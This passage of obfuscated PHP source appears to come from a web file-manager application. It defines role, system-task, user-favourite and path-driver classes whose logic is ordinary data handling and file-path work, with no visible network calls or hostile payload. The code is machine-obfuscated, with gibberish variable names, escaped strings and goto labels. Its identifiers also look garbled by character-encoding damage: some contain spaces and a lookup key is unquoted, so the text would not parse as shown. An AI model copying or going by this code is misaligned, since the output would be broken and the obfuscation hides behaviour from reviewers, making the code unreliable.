($ÊÀÄÃ´— as $¿çİ–ÓÛ => $×ÔŠ¡) { if ($×ÔŠ¡[$’£Ú’[2059]] == 1) { $ÊÀÄÃ´—[$¿çİ–ÓÛ][$’£Ú’[491]] = LNG($’£Ú’[2294]); } } } return $ÊÀÄÃ´—; } public function update($‹‰³ï Ì, $´†÷Š¹ø) { $Ïš€¬¸¤ =& $_SERVER[ªÏ§Ë·]; $ÁÉèÙÉ¿ = parent::listData($‹‰³ï Ì); $Ê€ªÒ×£ = $this->findByName($´†÷Š¹ø[$Ïš€¬¸¤[42]]); if (!$ÁÉèÙÉ¿ || $Ê€ªÒ×£ && $Ê€ªÒ×£[$Ïš€¬¸¤[437]] != $ÁÉèÙÉ¿[$Ïš€¬¸¤[437]]) { return !1; } if ($Ê€ªÒ×£[$Ïš€¬¸¤[2059]] == 1) { $´†÷Š¹ø = array($Ïš€¬¸¤[42] => $´†÷Š¹ø[$Ïš€¬¸¤[42]], $Ïš€¬¸¤[1880] => $´†÷Š¹ø[$Ïš€¬¸¤[1880]]); } $this->filterAuth($´†÷Š¹ø[$Ïš€¬¸¤[451]]); return parent::update($‹‰³ï Ì, $´†÷Š¹ø); } public function remove($®ÁÜÅå¬) { $À¦´›Õş = parent::listData($®ÁÜÅå¬); if (!$À¦´›Õş || $À¦´›Õş[$_SERVER[ªÏ§Ë·][1312]]) { return !1; } return parent::remove($®ÁÜÅå¬); } public function add($æ‰ÓãÈ·) { $ó¨Úã =& $_SERVER[ªÏ§Ë·]; $ÉÇñÎ¬Û = $æ‰ÓãÈ·[$ó¨Úã[42]]; if ($this->findByName($ÉÇñÎ¬Û)) { return !1; } $ÇÑ¿“à = array($ó¨Úã[458] => $ÉÇñÎ¬Û, $ó¨Úã[1863] => $ó¨Úã[12], $ó¨Úã[1859] => $ó¨Úã[1867], $ó¨Úã[2295] => 1, $ó¨Úã[1862] => 0, $ó¨Úã[2296] => 0, $ó¨Úã[1861] => $this->getSort()); $æ‰ÓãÈ· = array_merge($ÇÑ¿“à, $æ‰ÓãÈ·); $this->filterAuth($æ‰ÓãÈ·[$ó¨Úã[451]]); return parent::insert($æ‰ÓãÈ·); } private function getSort() { $ŞÏÕÒ€ =& $_SERVER[ªÏ§Ë·]; $ ÓÔÔÉ¤ = parent::listData(); $÷‰üáü = array_to_keyvalue($ ÓÔÔÉ¤, $ŞÏÕÒ€[12], $ŞÏÕÒ€[1881]); return empty($÷‰üáü) ? 0 : max($÷‰üáü) + 1; } private function filterAuth(&$À“¦¾Ÿƒ) { $·ÇœâÌ¯ =& $_SERVER[ªÏ§Ë·]; $Ğ¦¥Ôõ = array(); $æ„ùµç¥ = array_filter(explode($·ÇœâÌ¯[60], $À“¦¾Ÿƒ)); foreach ($æ„ùµç¥ as $À“¦¾Ÿƒ) { $Ñè›Î¢ = explode($·ÇœâÌ¯[10], $À“¦¾Ÿƒ); if ($Ñè›Î¢[0] == $·ÇœâÌ¯[2297] && $Ñè›Î¢[1] != $·ÇœâÌ¯[1215]) { $Áö¬¢Êœ = $Ñè›Î¢[0] . $·ÇœâÌ¯[10] . $Ñè›Î¢[1] . $·ÇœâÌ¯[2298]; if (!in_array($Áö¬¢Êœ, $æ„ùµç¥)) { $Ğ¦¥Ôõ[] = $Áö¬¢Êœ; } } $Ğ¦¥Ôõ[] = $À“¦¾Ÿƒ; } $À“¦¾Ÿƒ = implode($·ÇœâÌ¯[60], $Ğ¦¥Ôõ); } public function findRoleDefault() { $Áü¹Ï« =& $_SERVER[ªÏ§Ë·]; $ã˜¶ƒÏŒ = parent::listData(); $ğèÌ«ŸŠ = !1; foreach ($ã˜¶ƒÏŒ as $…ìÚé­û) { if (!$…ìÚé­û || $…ìÚé­û[$Áü¹Ï«[1879]] == $Áü¹Ï«[208] || $…ìÚé­û[$Áü¹Ï«[2059]] == 1) { continue; } if (strstr($…ìÚé­û[$Áü¹Ï«[451]], $Áü¹Ï«[2299])) { continue; } if (!strstr($…ìÚé­û[$Áü¹Ï«[451]], $Áü¹Ï«[2300])) { continue; } if (!$ğèÌ«ŸŠ) { $ğèÌ«ŸŠ = $…ìÚé­û; continue; } $şŞÃŸğµ = explode($Áü¹Ï«[60], $ğèÌ«ŸŠ[$Áü¹Ï«[451]]); $™¶•¢Ø´ = explode($Áü¹Ï«[60], $…ìÚé­û[$Áü¹Ï«[451]]); if (count($şŞÃŸğµ) > count($™¶•¢Ø´)) { $ğèÌ«ŸŠ = $…ìÚé­û; } } return $ğèÌ«ŸŠ ? $ğèÌ«ŸŠ[$Áü¹Ï«[437]] : $Áü¹Ï«[12]; } public function sort($Œ¥˜±›¹, $å¤¯Ç’ñ) { return parent::update($Œ¥˜±›¹, $å¤¯Ç’ñ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\x2e\x74\141\x73\153\x4c\x69\x73\x74"; public $field = array("\x6e\141\x6d\x65", "\164\171\x70\x65", "\x65\x76\145\156\x74", "\x74\x69\155\145", "\x64\x65\163\x63", "\163\x79\x73\164\x65\155", "\x65\156\141\x62\x6c\x65", "\x6c\141\x73\x74\x52\x75\x6e", "\x73\x6f\162\164"); public function listData($Â”·ìÚê = false, $ÆŠô¥· = "\x73\x6f\x72\164", $áù¤¹½‡ = false) { return parent::listData($Â”·ìÚê, $ÆŠô¥·, $áù¤¹½‡); } public function add($È™›”Ê®) { $Úêç”† =& $_SERVER[ªÏ§Ë·]; $Ÿœ¦´¾“ = $this->findByName($È™›”Ê®[$Úêç”†[42]]); if ($Ÿœ¦´¾“) { return !1; } $È™›”Ê®[$Úêç”†[1627]] = 0; $È™›”Ê®[$Úêç”†[1881]] = $this->getSort(); return parent::insert($È™›”Ê®); } private function getSort() { $œÕÄõ =& $_SERVER[ªÏ§Ë·]; $¹½ù¡Á§ = parent::listData(); $øªÁÄú = array_to_keyvalue($¹½ù¡Á§, $œÕÄõ[12], $œÕÄõ[1881]); return empty($øªÁÄú) ? 0 : max($øªÁÄú) + 1; } public function update($ó¤³‡‘ù, $÷õôƒş) { $ÃúğÍÓ¶ =& $_SERVER[ªÏ§Ë·]; $ŠÒñûõ” = $this->listData($ó¤³‡‘ù); $š‚ĞÊ®˜ = $this->findByName($÷õôƒş[$ÃúğÍÓ¶[42]]); if (!$ŠÒñûõ” || $š‚ĞÊ®˜ && $š‚ĞÊ®˜[$ÃúğÍÓ¶[437]] != $ŠÒñûõ”[$ÃúğÍÓ¶[437]]) { return !1; } return parent::update($ó¤³‡‘ù, $÷õôƒş); } public function remove($¤¥»Ù¤ö, $äş¿Êñ· = false) { $êšˆ±üå =& $_SERVER[ªÏ§Ë·]; $–¥šÀœÑ = $this->listData($¤¥»Ù¤ö); if (!$–¥šÀœÑ) { return; } if (!$äş¿Êñ· && $–¥šÀœÑ[$êšˆ±üå[1312]] == $êšˆ±üå[98]) { return !1; } return parent::remove($¤¥»Ù¤ö); } public function enable($¤¿•§µà, $âÎ³¶÷©) { return $this->update($¤¿•§µà, array($_SERVER[ªÏ§Ë·][2289] => $âÎ³¶÷©)); } public function run($á×šÑÇˆ) { return $this->update($á×šÑÇˆ, array($_SERVER[ªÏ§Ë·][2301] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\x66\141\166"; protected function cacheFunctionAlias($Î‰‚Œ«Ì) { $˜¿åäÍ =& $_SERVER[ªÏ§Ë·]; return array($˜¿åäÍ[1968] => array(USER_ID, $˜¿åäÍ[2302])); } protected function listData() { $İş£«ğå =& $_SERVER[ªÏ§Ë·]; $¿äëˆíÏ = array($İş£«ğå[1658] => USER_ID, $İş£«ğå[521] => 0); $ÏâÊØÊ = $İş£«ğå[2303]; $µÆğ´”Œ = $this->field($ÏâÊØÊ)->where($¿äëˆíÏ)->order($İş£«ğå[2304])->select(); return $µÆğ´”Œ ? $µÆğ´”Œ : array(); } protected function resetCache() { } protected function listView() { $—Æû¿«õ =& $_SERVER[ªÏ§Ë·]; $ë§àí¡’ = $this->listData(); $Ã»åúŸÉ = array_filter_by_field($ë§àí¡’, $—Æû¿«õ[43], $—Æû¿«õ[454]); $…Éşóı = array_to_keyvalue($Ã»åúŸÉ, $—Æû¿«õ[12], $—Æû¿«õ[94]); if (!$…Éşóı) { return $ë§àí¡’; } $ßäÄãÎè = 2000; $«ô†â’€ = array($—Æû¿«õ[455] => array($—Æû¿«õ[456], $…Éşóı)); $Ìƒ×ÌÓ¾ = Model($—Æû¿«õ[853])->listSource($«ô†â’€, $ßäÄãÎè); $Ìƒ×ÌÓ¾ = array_merge($Ìƒ×ÌÓ¾[$—Æû¿«õ[93]], $Ìƒ×ÌÓ¾[$—Æû¿«õ[92]]); $Ìƒ×ÌÓ¾ = array_to_keyvalue($Ìƒ×ÌÓ¾, $—Æû¿«õ[440]); foreach ($ë§àí¡’ as $Åï™õÂô => $Í˜Ìşî¸) { $²’Ã«­Û = $Ìƒ×ÌÓ¾[$Í˜Ìşî¸[$—Æû¿«õ[94]]]; $²’Ã«­Û = $²’Ã«­Û ? $²’Ã«­Û : array(); $ë§àí¡’[$Åï™õÂô] = array_merge($²’Ã«­Û, $Í˜Ìşî¸); } return $ë§àí¡’; } protected function addFav($üóè®¼Ş, $Šôùø¶ó = '', $ú’âÍĞÜ = "\163\x6f\x75\x72\x63\x65") { $ïÅÔÁè =& $_SERVER[ªÏ§Ë·]; $öı´ê„¦ = array($ïÅÔÁè[1658] => USER_ID, $ïÅÔÁè[521] => 0, $ïÅÔÁè[460] => $ú’âÍĞÜ, $ïÅÔÁè[459] => $üóè®¼Ş); if ($this->where($öı´ê„¦)->find()) { return !1; } $öı´ê„¦ = array($ïÅÔÁè[1658] => USER_ID, $ïÅÔÁè[521] => 0); $û‚ñü– = $this->where($öı´ê„¦)->max($ïÅÔÁè[1881]); if (!$û‚ñü–) { $û‚ñü– = 0; } if (!$Šôùø¶ó && $ú’âÍĞÜ == $ïÅÔÁè[454]) { $¦Öº©åã = Model($ïÅÔÁè[1358])->where(array($ïÅÔÁè[455] => $üóè®¼Ş))->find(); if (!$¦Öº©åã) { return !1; } $Šôùø¶ó = $¦Öº©åã[$ïÅÔÁè[42]]; } $Šôùø¶ó = $this->getAutoName($Šôùø¶ó); $‡¬ñšãÆ = array($ïÅÔÁè[1658] => USER_ID, $ïÅÔÁè[521] => 0, $ïÅÔÁè[458] => $Šôùø¶ó, $ïÅÔÁè[459] => $üóè®¼Ş, $ïÅÔÁè[460] => $ú’âÍĞÜ, $ïÅÔÁè[1861] => $û‚ñü– + 1); return $this->add($‡¬ñšãÆ); } protected function remove($úã¸µöÁ) { $“â­®ó =& $_SERVER[ªÏ§Ë·]; $¸×¨ŠÙ = array($“â­®ó[1658] => USER_ID, $“â­®ó[457] => $úã¸µöÁ); return $this->where($¸×¨ŠÙ)->delete(); } protected function removeByName($ìôÑìĞ¼) { $ÁÔì¦ñ =& $_SERVER[ªÏ§Ë·]; $‡ÕÔÌ¢ò = array($ÁÔì¦ñ[1658] => USER_ID, $ÁÔì¦ñ[458] => $ìôÑìĞ¼, $ÁÔì¦ñ[521] => 0); return $this->where($‡ÕÔÌ¢ò)->delete(); } protected function rename($‰Âëß½ö, $×Èê¥Ì¾) { $Íğİ…œŸ =& $_SERVER[ªÏ§Ë·]; if ($‰Âëß½ö == $×Èê¥Ì¾) { return !1; } $Ó‘‰ãÑú = $this->getAutoName($×Èê¥Ì¾); if ($×Èê¥Ì¾ != $Ó‘‰ãÑú) { return !1; } $šğ‚ÉÁ = array($Íğİ…œŸ[1658] => USER_ID, $Íğİ…œŸ[521] => 0, $Íğİ…œŸ[42] => $‰Âëß½ö); return $this->where($šğ‚ÉÁ)->save(array($Íğİ…œŸ[42] => $×Èê¥Ì¾)); } protected function resetSort($¬×æ¥İÁ) { $ûş®õˆË =& $_SERVER[ªÏ§Ë·]; $¬×æ¥İÁ = is_array($¬×æ¥İÁ) ? $¬×æ¥İÁ : array(); $¿ƒ°Â•° = array($ûş®õˆË[1658] => USER_ID); for ($ÎÒ–¤İ¹ = 0; $ÎÒ–¤İ¹ < count($¬×æ¥İÁ); $ÎÒ–¤İ¹++) { $¿ƒ°Â•°[$ûş®õˆË[457]] = $¬×æ¥İÁ[$ÎÒ–¤İ¹]; $this->where($¿ƒ°Â•°)->save(array($ûş®õˆË[1861] => $ÎÒ–¤İ¹ + 1)); } return !0; } protected function moveTop($„®À¥¾ñ) { $ØŸŠ¸âñ =& $_SERVER[ªÏ§Ë·]; $ºÎæÃÁ° = array($ØŸŠ¸âñ[1658] => USER_ID, $ØŸŠ¸âñ[521] => 0); $İÊòÏå = $this->where($ºÎæÃÁ°)->where(array($ØŸŠ¸âñ[42] => $„®À¥¾ñ))->find(); if (!$İÊòÏå) { return; } $¥õç¤’· = $this->field($ØŸŠ¸âñ[437])->where($ºÎæÃÁ°)->order($ØŸŠ¸âñ[2304])->select(); $¥õç¤’· = array_to_keyvalue($¥õç¤’·, $ØŸŠ¸âñ[12], $ØŸŠ¸âñ[437]); $¥ËŠÀ¿Î = $¥õç¤’·; $¥õç¤’· = array_remove_value($¥õç¤’·, $İÊòÏå[$ØŸŠ¸âñ[437]]); array_unshift($¥õç¤’·, $İÊòÏå[$ØŸŠ¸âñ[437]]); return $this->resetSort($¥õç¤’·); } protected function moveBottom($ßîğö·û) { $™ô™ˆˆ¢ =& $_SERVER[ªÏ§Ë·]; $ë²¦·ìÄ = array($™ô™ˆˆ¢[1658] => USER_ID, $™ô™ˆˆ¢[521] => 0); $Ñ£ò¬È = $this->where($ë²¦·ìÄ)->max($™ô™ˆˆ¢[1881]); $“İòõùÚ = array($™ô™ˆˆ¢[1881] => $Ñ£ò¬È + 1); return $this->where($ë²¦·ìÄ)->where(array($™ô™ˆˆ¢[42] => $ßîğö·û))->save($“İòõùÚ); } private function getAutoName($¡ã÷¾íÔ) { $ë•à»” =& $_SERVER[ªÏ§Ë·]; $û‡ùÆ£Ô = array($ë•à»”[1658] => USER_ID, $ë•à»”[521] => 0); $Ìí›Ûúï = $this->field($ë•à»”[42])->where($û‡ùÆ£Ô)->select(); $Ìí›Ûúï = array_to_keyvalue($Ìí›Ûúï, $ë•à»”[12], $ë•à»”[42]); if (!$Ìí›Ûúï || !in_array($¡ã÷¾íÔ, $Ìí›Ûúï)) { return $¡ã÷¾íÔ; } for ($Ç¤É¸õ© = 0; $Ç¤É¸õ© < count($Ìí›Ûúï); $Ç¤É¸õ©++) { if (!in_array($¡ã÷¾íÔ . "\50{$Ç¤É¸õ©}\51", $Ìí›Ûúï)) { return $¡ã÷¾íÔ . "\x28{$Ç¤É¸õ©}\51"; } } return $¡ã÷¾íÔ . "\50{$Ç¤É¸õ©}\51"; } } goto eµµËíÀšé; a¹òÏ©¡ŸÅ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¾ÑáÙ‡ =& $_SERVER[ªÏ§Ë·]; $this->objectDriver = array($¾ÑáÙ‡[70], $¾ÑáÙ‡[71], $¾ÑáÙ‡[72], $¾ÑáÙ‡[73], $¾ÑáÙ‡[74], $¾ÑáÙ‡[75], $¾ÑáÙ‡[76], $¾ÑáÙ‡[77], $¾ÑáÙ‡[78]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Ü£Ä­) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Ü£Ä­, $_SERVER[ªÏ§Ë·][8]); } return $Ü£Ä­; } public function iconvApp($¨äöÍŸ÷) { return $¨äöÍŸ÷; } public function iconvSystem($ùÔ¦±ª) { return $ùÔ¦±ª; } public function iconvTo($­¹Îˆ°“, $Ã£ÙŒ«Ë, $Ê¯©´¿¹) { $íÖ®İ›¨ =& $_SERVER[ªÏ§Ë·]; if (!$­¹Îˆ°“ || !function_exists($íÖ®İ›¨[79])) { return $­¹Îˆ°“; } static $Ş´±”ûØ = array(); $ôµÃ‚ñŒ = $Ã£ÙŒ«Ë . $íÖ®İ›¨[80] . $Ê¯©´¿¹ . $íÖ®İ›¨[81] . $­¹Îˆ°“; if (isset($Ş´±”ûØ[$ôµÃ‚ñŒ])) { return $Ş´±”ûØ[$ôµÃ‚ñŒ]; } if (function_exists($íÖ®İ›¨[82])) { $ÄìÓ¢³ = @mb_convert_encoding($­¹Îˆ°“, $Ê¯©´¿¹, $Ã£ÙŒ«Ë); } else { $ÄìÓ¢³ = @iconv($Ã£ÙŒ«Ë, $Ê¯©´¿¹, $­¹Îˆ°“); } $ÄìÓ¢³ = $ÄìÓ¢³ ? $ÄìÓ¢³ : $­¹Îˆ°“; if (strstr($ÄìÓ¢³, $íÖ®İ›¨[83])) { $ÄìÓ¢³ = str_replace($íÖ®İ›¨[83], $íÖ®İ›¨[11], $ÄìÓ¢³); } $Ş´±”ûØ[$Ã£ÙŒ«Ë . $íÖ®İ›¨[80] . $Ê¯©´¿¹ . $íÖ®İ›¨[81] . $­¹Îˆ°“] = $ÄìÓ¢³; $Ş´±”ûØ[$Ê¯©´¿¹ . $íÖ®İ›¨[80] . $Ã£ÙŒ«Ë . $íÖ®İ›¨[81] . $­¹Îˆ°“] = $­¹Îˆ°“; $Ş´±”ûØ[$Ê¯©´¿¹ . $íÖ®İ›¨[80] . $Ã£ÙŒ«Ë . $íÖ®İ›¨[81] . $ÄìÓ¢³] = $­¹Îˆ°“; $Ş´±”ûØ[$Ã£ÙŒ«Ë . $íÖ®İ›¨[80] . $Ê¯©´¿¹ . $íÖ®İ›¨[81] . $ÄìÓ¢³] = $ÄìÓ¢³; return $ÄìÓ¢³; } public function getPathInner($Ø²è­‚) { $éæé£Àû = IO::init($Ø²è­‚); return $éæé£Àû->path; } public function getPathOuter($øÉü¨Ê´) { $Ù¸ˆÖ¶– =& $_SERVER[ªÏ§Ë·]; $ı­éÎ‹Ù = strlen(trim($this->pathBase, $Ù¸ˆÖ¶–[8])); $øÉü¨Ê´ = substr(trim($øÉü¨Ê´, $Ù¸ˆÖ¶–[8]), $ı­éÎ‹Ù); return $this->pathDriver . $Ù¸ˆÖ¶–[8] . ltrim($øÉü¨Ê´, $Ù¸ˆÖ¶–[8]); } public function isParentOf($ıÄŒç•, $üòì) { $÷¤Ö‡å =& $_SERVER[ªÏ§Ë·]; $ıÄŒç• = rtrim(strtolower($ıÄŒç•), $÷¤Ö‡å[8]) . $÷¤Ö‡å[8]; $üòì = rtrim(strtolower($üòì), $÷¤Ö‡å[8]) . $÷¤Ö‡å[8]; $Ü¢ÚÀ˜Ê = strpos($üòì, $ıÄŒç•) === 0; return $Ü¢ÚÀ˜Ê; } public function getType() { $€€¢€“÷ =& $_SERVER[ªÏ§Ë·]; $…İ¡†ù´ = str_replace($€€¢€“÷[84], $€€¢€“÷[12], get_class($this)); return strtolower($…İ¡†ù´); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($şù°ò÷, $è–ô½â·) { $èÛÁò¾ƒ =& $_SERVER[ªÏ§Ë·]; $Íü¥šÊ¹ = rtrim($şù°ò÷, $èÛÁò¾ƒ[8]) . $èÛÁò¾ƒ[8] . $è–ô½â·; $³âÒóµˆ = $this->exist($Íü¥šÊ¹); return $³âÒóµˆ ? $Íü¥šÊ¹ : !1; } public function setModifyTime($èŸñ—»®, $ ËıçÆ¡ = '') { } public function renameObject($®ñÔĞîá, $»Ñßº¯„) { $ÅÏĞºù° = $»Ñßº¯„; $®ñÔĞîá = $this->getPathOuter($®ñÔĞîá); $»Ñßº¯„ = $this->pathFather($®ñÔĞîá) . $»Ñßº¯„; $Ñ³•Ã…Ï = IO::copy($®ñÔĞîá, $this->pathFather($®ñÔĞîá), REPEAT_RENAME_FOLDER, $ÅÏĞºù°); if ($Ñ³•Ã…Ï) { IO::remove($®ñÔĞîá); } return $Ñ³•Ã…Ï ? $»Ñßº¯„ : !1; } public function tempFile($óÏ›šéõ = '', $ŠÑòï€ = '') { if (!$óÏ›šéõ) { $óÏ›šéõ = rand_string(15); } $úï£˜å× = TEMP_FILES . rand_string(15) . $_SERVER[ªÏ§Ë·][8]; @mkdir($úï£˜å×, DEFAULT_PERRMISSIONS, !0); $ë”Îô˜” = $úï£˜å× . $óÏ›šéõ; @touch($ë”Îô˜”); if ($ŠÑòï€) { file_put_contents($ë”Îô˜”, $ŠÑòï€); } return $ë”Îô˜”; } public function tempFileRemve($”±óÚŒú) { @unlink($”±óÚŒú); @rmdir($this->pathFather($”±óÚŒú)); } public function mkfile($–ÊÙ‰šë, $ÓîÑµßİ = '', $Úá€Èùö = REPEAT_RENAME) { } public function mkdir($‰‚İ‰å¥, $ÚêëĞÉ = REPEAT_SKIP) { } public function delFile($Šƒµû¼¥) { } public function delFolder($¶ó¨Ø»‰) { } public function copyFile($šÜ«ÛÑÔ, $—ÔÒÅØÏ) { } public function moveFile($ùƒ®¬â, $ÁØ©ìÂ) { } public function remove($¶¤Ïñë) { if ($this->isFile($¶¤Ïñë)) { return $this->delFile($¶¤Ïñë); } return $this->delFolder($¶¤Ïñë); } public function rename($Ç¢ĞÖØé, $äÇ¸­ƒ”) { } public function exist($Æ“»úØ) { } public function findByHash($ÛşµÉ‡œ = '', $ß¶ìÀ‰± = '') { return !1; } public function isFile($‹Ò†µ) { } public function isFolder($ïÃÛ¡½ğ) { } public function size($ÔÁĞ˜»İ) { } public function info($¥ÚÇĞŸ) { } public function infoSimple($­È—®ß) { return $this->info($­È—®ß); } public function infoAuth($Õ³­†¥) { return $this->info($Õ³­†¥); } public function infoFull($–ëÌÁîÓ) { return $this->info($–ëÌÁîÓ); } public function infoWithChildren($¢”ß‘¬®) { $İÔúÙÑÈ =& $_SERVER[ªÏ§Ë·]; static $áéÁ×€ = array(); if (isset($áéÁ×€[$¢”ß‘¬®])) { return $áéÁ×€[$¢”ß‘¬®]; } $ÑŠİ­úø = $this->info($¢”ß‘¬®); if ($ÑŠİ­úø && $ÑŠİ­úø[$İÔúÙÑÈ[43]] == $İÔúÙÑÈ[85]) { $„ÙşŠş = array($İÔúÙÑÈ[86] => 0, $İÔúÙÑÈ[87] => 0, $İÔúÙÑÈ[88] => 0); $this->infoChildren($¢”ß‘¬®, $„ÙşŠş); $ÑŠİ­úø[$İÔúÙÑÈ[86]] = $„ÙşŠş[$İÔúÙÑÈ[86]]; $ÑŠİ­úø[$İÔúÙÑÈ[89]] = array($İÔúÙÑÈ[90] => $„ÙşŠş[$İÔúÙÑÈ[87]], $İÔúÙÑÈ[91] => $„ÙşŠş[$İÔúÙÑÈ[88]]); $áéÁ×€[$¢”ß‘¬®] = $ÑŠİ­úø; } return $ÑŠİ­úø; } public function listPath($˜Ì£¡›, $åè·şˆî = false) { } public function has($ö³´Úˆî, $ıú«—Í = false, $Îˆ ËË = false) { } public function canRead($Àı¸£‰Õ) { } public function canWrite($ò€×Âş) { } public function getContent($ãæÔ°Éì) { } public function setContent($ÑÕçİ¬ó, $™Âè¨Ï£ = '') { } protected function infoChildren($ŞÖ¨‰ã‡, &$Ëàˆöáø) { $î·¶û€ =& $_SERVER[ªÏ§Ë·]; check_abort_echo(); $¤ËÃ½õ× = $this->listPath($ŞÖ¨‰ã‡, !0); $¤ËÃ½õ× = array_merge($¤ËÃ½õ×[$î·¶û€[92]], $¤ËÃ½õ×[$î·¶û€[93]]); foreach ($¤ËÃ½õ× as $½Š ÉüÆ) { if ($½Š ÉüÆ[$î·¶û€[43]] == $î·¶û€[85]) { $Ëàˆöáø[$î·¶û€[88]]++; $ÕŒ¬ßêº = $this->getPathInner($½Š ÉüÆ[$î·¶û€[94]]); $this->infoChildren($ÕŒ¬ßêº, $Ëàˆöáø); } else { $Ëàˆöáø[$î·¶û€[87]]++; $Ëàˆöáø[$î·¶û€[86]] += $½Š ÉüÆ[$î·¶û€[86]]; } } } public function fileSubstr($Î¢ú½æÏ, $ŒÇ™Á´—, $¨º¦ƒ‚˜) { } public function listAll($Ü“ãØÕà) { } public function listAllMake($¥ƒŸµû, &$±ÎíŸ«À) { $õ÷¼úÜ =& $_SERVER[ªÏ§Ë·]; check_abort_echo(); $í¡’Ş¼± = $this->listPath($¥ƒŸµû, !0); if (!$í¡’Ş¼±) { return; } $¥Ä—ÕËÀ = array_merge($í¡’Ş¼±[$õ÷¼úÜ[92]], $í¡’Ş¼±[$õ÷¼úÜ[93]]); foreach ($¥Ä—ÕËÀ as $š¦ËŒúô) { $®òˆıÇ = $š¦ËŒúô[$õ÷¼úÜ[43]] == $õ÷¼úÜ[85]; $ë³‡Ã€¢ = array($õ÷¼úÜ[94] => $š¦ËŒúô[$õ÷¼úÜ[94]], $õ÷¼úÜ[85] => $®òˆıÇ); if (isset($š¦ËŒúô[$õ÷¼úÜ[86]])) { $ë³‡Ã€¢[$õ÷¼úÜ[86]] = $š¦ËŒúô[$õ÷¼úÜ[86]]; } if (isset($š¦ËŒúô[$õ÷¼úÜ[95]])) { $ë³‡Ã€¢[$õ÷¼úÜ[95]] = $š¦ËŒúô[$õ÷¼úÜ[95]]; } if (!$®òˆıÇ) { $±ÎíŸ«À[] = $ë³‡Ã€¢; continue; } $±ÎíŸ«À[] = $ë³‡Ã€¢; $†ï³íâå = $š¦ËŒúô[$õ÷¼úÜ[94]]; $ì¿›Â”° = $this->pathDriver; if (substr($š¦ËŒúô[$õ÷¼úÜ[94]], 0, strlen($ì¿›Â”°)) == $ì¿›Â”°) { $†ï³íâå = substr($†ï³íâå, strlen($ì¿›Â”°)); } $this->listAllMake($†ï³íâå, $±ÎíŸ«À); } } public function listAllSimple($ï‘ººĞõ, $’Ìâıà‹ = false) { $¸µÚ§û‰ = $this->listAll($ï‘ººĞõ); return $this->listAllSimpleMake($¸µÚ§û‰, $this->getPathOuter($ï‘ººĞõ), $’Ìâıà‹); } public function listAllSimpleMake($œæò¥£õ, $’ ¾ÂÔ», $€Ÿ´ô¶ê) { $õ¿Œİ¥ =& $_SERVER[ªÏ§Ë·]; $å–äªİ = array(); $’ ¾ÂÔ» = rtrim(get_path_father($’ ¾ÂÔ»), $õ¿Œİ¥[8]) . $õ¿Œİ¥[8]; foreach ($œæò¥£õ as $íöÅ»œ) { $ô›Š˜–› = array($õ¿Œİ¥[94] => $íöÅ»œ[$õ¿Œİ¥[94]], $õ¿Œİ¥[96] => $íöÅ»œ[$õ¿Œİ¥[94]], $õ¿Œİ¥[85] => $íöÅ»œ[$õ¿Œİ¥[85]]); if (isset($íöÅ»œ[$õ¿Œİ¥[86]]) && !$íöÅ»œ[$õ¿Œİ¥[85]]) { $ô›Š˜–›[$õ¿Œİ¥[86]] = $íöÅ»œ[$õ¿Œİ¥[86]]; } if (isset($íöÅ»œ[$õ¿Œİ¥[95]])) { $ô›Š˜–›[$õ¿Œİ¥[95]] = $íöÅ»œ[$õ¿Œİ¥[95]]; } if (is_array($íöÅ»œ[$õ¿Œİ¥[97]])) { $ô›Š˜–›[$õ¿Œİ¥[96]] = $íöÅ»œ[$õ¿Œİ¥[97]][$õ¿Œİ¥[94]]; $ô›Š˜–›[$õ¿Œİ¥[86]] = $íöÅ»œ[$õ¿Œİ¥[97]][$õ¿Œİ¥[86]]; $ô›Š˜–›[$õ¿Œİ¥[95]] = $íöÅ»œ[$õ¿Œİ¥[97]][$õ¿Œİ¥[95]]; } else { if (substr($íöÅ»œ[$õ¿Œİ¥[94]], 0, strlen($’ ¾ÂÔ»)) == $’ ¾ÂÔ») { $ô›Š˜–›[$õ¿Œİ¥[94]] = substr($íöÅ»œ[$õ¿Œİ¥[94]], strlen($’ ¾ÂÔ»)); } } $ –ø¦Ø = $íöÅ»œ[$õ¿Œİ¥[85]] ? $õ¿Œİ¥[8] : $õ¿Œİ¥[12]; $ô›Š˜–›[$õ¿Œİ¥[96]] = rtrim($ô›Š˜–›[$õ¿Œİ¥[96]], $õ¿Œİ¥[8]) . $ –ø¦Ø; $ô›Š˜–›[$õ¿Œİ¥[94]] = $õ¿Œİ¥[8] . trim($ô›Š˜–›[$õ¿Œİ¥[94]], $õ¿Œİ¥[8]) . $ –ø¦Ø; if (!$€Ÿ´ô¶ê) { $ü¨—€Ö¥ = explode($õ¿Œİ¥[8], trim($ô›Š˜–›[$õ¿Œİ¥[94]], $õ¿Œİ¥[8])); $ô›Š˜–›[$õ¿Œİ¥[94]] = $õ¿Œİ¥[8] . implode($õ¿Œİ¥[8], array_slice($ü¨—€Ö¥, 1)) . $ –ø¦Ø; } $å–äªİ[] = $ô›Š˜–›; } return array_sort_by($å–äªİ, $õ¿Œİ¥[94]); } public function upload($÷¹‘µ—›, $±¾ÖÉŸÆ, $îåìßÚø = false, $·˜¶»õı = REPEAT_REPLACE) { } public function uploadFileByID($åÌÙˆ²„, $‘¬²–¶¦, $¢Êı• Ã) { } public function uploadFileByPath($·Ÿ®Ø‘», $ù«Ø¸áú, $‡äÅªõ¢ = array()) { } public function isUploadServer() { $¹»¤ íè =& $_SERVER[ªÏ§Ë·]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $¹»¤ íè[98]) { return !0; } return $GLOBALS[$¹»¤ íè[6]][$¹»¤ íè[99]][$¹»¤ íè[100]]; } public function isFileOutServer() { $‚Ûı†Ó÷ =& $_SERVER[ªÏ§Ë·]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $‚Ûı†Ó÷[98]) { return !0; } return $GLOBALS[$‚Ûı†Ó÷[6]][$‚Ûı†Ó÷[99]][$‚Ûı†Ó÷[101]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($ıçÅÌú) { $ÌÂ¯Óò =& $_SERVER[ªÏ§Ë·]; if (!$this->isCdnHost()) { return $ıçÅÌú; } return str_replace(trim(get_url_root($ıçÅÌú), $ÌÂ¯Óò[8]), 